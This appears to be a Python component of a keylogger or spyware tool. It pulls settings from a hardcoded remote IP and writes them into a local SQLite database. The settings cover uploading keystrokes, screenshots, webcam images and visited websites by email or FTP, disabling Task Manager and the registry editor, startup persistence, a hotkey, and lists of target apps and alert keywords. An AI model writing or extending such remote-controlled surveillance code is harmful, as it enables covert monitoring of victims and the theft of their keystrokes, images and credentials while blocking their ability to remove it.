import sqlite3
import json
import requests

#Đồng bộ xuống
import urllib.request
from getsqldata import getCurrentUser

uid = getCurrentUser();
download = sqlite3.connect("../database.db")
c = download.cursor()

p = c.execute('select username from Users where id = (select id from current_user)')
p = p.fetchone()[0]
payload = {'user':p}
url = "http://178.128.85.16/sync-settings-down"
#headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
print(payload)

r = requests.post(url, data=payload)#, headers=headers)
result = r.content
#print(result)
##result = urllib.request.urlopen(url).read()
result = result.decode('utf-8')
result = json.loads(result)

alert = result['alert']
enableEmail = alert['enableEmail'] == True and '1' or '0'
enableScreenshot = alert['enableScreenshot'] == True and '1' or '0'
c.execute(  'update Alerts set sendMail = ?, scrShot = ? where id = ?',(enableEmail, enableScreenshot, uid))

email = result['email']
enableClear = email['enableClear'] == True and '1' or '0'
enableEmail = email['enableEmail'] == True and '1' or '0'
enableLimit = email['enableLimit'] == True and '1' or '0'
enableUploadImage = email['enableUploadImage'] == True and '1' or '0'
enableUploadKeystroke = email['enableUploadKeystroke'] == True and '1' or '0'
enableUploadWebcam = email['enableUploadWebcam'] == True and '1' or '0'
enableUploadWebsite = email['enableUploadWebsite'] == True and '1' or '0'
enableZip = email['enableZip'] == True and '1' or '0'
hoursEmail = str(email['hoursEmail'])
limitEmail = str(email['limitEmail'])
minutesEmail = str(email['minutesEmail'])
passwordEmail = email['passwordEmail']
passwordZipEmail = email['passwordZipEmail']
portEmail = str(email['portEmail'])
smtpEmail = email['smtpEmail']
subjectEmail = email['subjectEmail']
userEmail = email['userEmail']
sendTo = email['sendTo']
c.execute(' update EmailDelivery set sendto = ?, smpt = ?, port = ?, uname = ?, password = ?, subject = ? where id = ?',(sendTo, smtpEmail, portEmail, userEmail, passwordEmail, subjectEmail,uid))
c.execute(' update Email set enable = ?, hours = ?, minutes = ?, upKeystroke = ?, upScrshot = ?, upWebcam = ?, upWebsite = ?, enLimit = ?, limitSize = ?, clear = ?, zipPasswd = ?, enZipPass = ? where id = ?',(enableEmail, hoursEmail, minutesEmail, enableUploadKeystroke, enableUploadImage, enableUploadWebcam, enableUploadWebsite, enableLimit,limitEmail, enableClear, passwordZipEmail, enableZip,uid ))

general = result['general']
disableRegistry = general['disableRegistry'] == True and '1' or '0'
disableTaskManager = general['disableTaskManager'] == True and '1' or '0'
enableEncrypt = general['enableEncrypt'] == True and '1' or '0'
enableHotkey = general['enableHotkey'] == True and '1' or '0'
enableStartup = general['enableStartup'] == True and '1' or '0'
hotkeyGeneral = general['hotkeyGeneral']
c.execute(' update General set disTaskManager = ?, disRegedit = ?, encrlog = ?, startup = ?, hotkey = ?, enHotkey = ? where id = ?',(disableTaskManager,disableRegistry, enableEncrypt, enableStartup, hotkeyGeneral, enableHotkey,uid))

screenshot = result['screenshot']
deleteScreenshot = str(screenshot['deleteScreenshot'])
enableDelete = screenshot['enableDelete'] == True and '1' or '0'
enableDouble = screenshot['enableDouble'] == True and '1' or '0'
enableTimestamp = screenshot['enableTimestamp'] == True and '1' or '0'
enableScreenshot = screenshot['enableScreenshot'] == True and '1' or '0'
hoursScreenshot = str(screenshot['hoursScreenshot'])
minutesScreenshot = str(screenshot['minutesScreenshot'])
qualityScreenshot = str(screenshot['qualityScreenshot'])
datetimeScreenshot = str(screenshot['dateDelete'])

c.execute('update Screenshot set enable = ?, timeNuser = ?,doubleScr = ?, enDel = ?, daysDel = ?, hours = ?,minutes = ?, quality = ?, datetime = ? where id = ?',(enableScreenshot, enableTimestamp, enableDouble, enableDelete, deleteScreenshot, hoursScreenshot, minutesScreenshot, qualityScreenshot, datetimeScreenshot,uid))

target = result['target']
enableAll = target['enableAll'] == True and '1' or '0'
enableOnly = target['enableOnly'] == True and '1' or '0'
c.execute(' update Targets set enAllApp = ?, enFollowApp = ? where id = ?',(enableAll, enableOnly,uid))

# missing datetime
webcam = result['webcam']
daysWebcam = str(webcam['daysWebcam'])
enableDelete = webcam['enableWebcam'] == True and '1' or '0'
enableDeleteUpload = webcam['enableDeleteUpload'] == True and '1' or '0'
enableWebcam = webcam['enableWebcam'] == True and '1' or '0'
hoursWebcam = str(webcam['hoursWebcam'])
minutesWebcam = str(webcam['minutesWebcam'])
datetimeWebcam = str(webcam['dateDelete'])
c.execute('update Webcam set enable = ?, hours = ?, minutes = ?, enDelEvery = ?, days = ?, enDelAfterUpload = ? , datetime = ? where id = ?',(enableWebcam, hoursWebcam, minutesWebcam, enableDelete, daysWebcam,enableDeleteUpload, datetimeWebcam,uid))

ftp = result['ftp']
enableClear = ftp['enableClear'] == True and '1' or '0'
enableFTP = ftp['enableFTP'] == True and '1' or '0'
enableLimit = ftp['enableLimit'] == True and '1' or '0'
enablePassive = ftp['enablePassive'] == True and '1' or '0'
enableUploadImage = ftp['enableUploadImage'] == True and '1' or '0'
enableUploadKeystroke = ftp['enableUploadKeystroke'] == True and '1' or '0'
enableUploadWebcam = ftp['enableUploadWebcam'] == True and '1' or '0'
enableUploadWebsite = ftp['enableUploadWebsite'] == True and '1' or '0'
hostnameFTP = ftp['hostnameFTP']
hoursFTP = str(ftp['hoursFTP'])
limitFTP = str(ftp['limitFTP'])
minutesFTP = str(ftp['minutesFTP'])
passwordFTP = ftp['passwordFTP']
remoteDirFTP = ftp['remoteDirFTP']
userFTP = ftp['userFTP']
c.execute(' update FTPServer set hostname = ?, uname = ?, password = ?, dir = ?, passiveMode = ? where id = ?',(hostnameFTP, userFTP, passwordFTP, remoteDirFTP, enablePassive,uid))
c.execute(' update FTP set enable = ?, hours = ?, minutes = ?, upKeystroke = ?, upScrshot = ?, upWebcam = ?, upWebsite = ?, upSize = ?, size = ?, clear = ? where id = ?',(enableFTP, hoursFTP, minutesFTP, enableUploadKeystroke, enableUploadImage, enableUploadWebcam, enableUploadWebsite, enableLimit, limitFTP, enableClear,uid))

keywordTarget = result['keywordTarget']
application = keywordTarget['application']
title = keywordTarget['title']
c.execute('delete from TargetList')
length = len(application) > len(title) and len(application) or len(title)
for i in range(1, length + 1):
    if (len(application) >= i):
        itemApplication = str(application[i - 1])
    else:
        itemApplication = '@'

    if (len(title) >= i):
        itemTitle = str(title[i - 1])
    else:
        itemTitle = '@'
    c.execute('insert into TargetList(id, byApp, byName) values (?, ?, ?)',(uid, itemApplication, itemTitle))

keywordAlert = result['keywordAlert']
keyword = keywordAlert['list']
c.execute('delete from AlertList')
length = len(keyword)
print (length)
for i in range(1, length + 1):
    itemKeyword = str(keyword[i - 1])
    c.execute('insert into AlertList(id,key) values (?,?)',(uid, itemKeyword))



download.commit()
download.close()

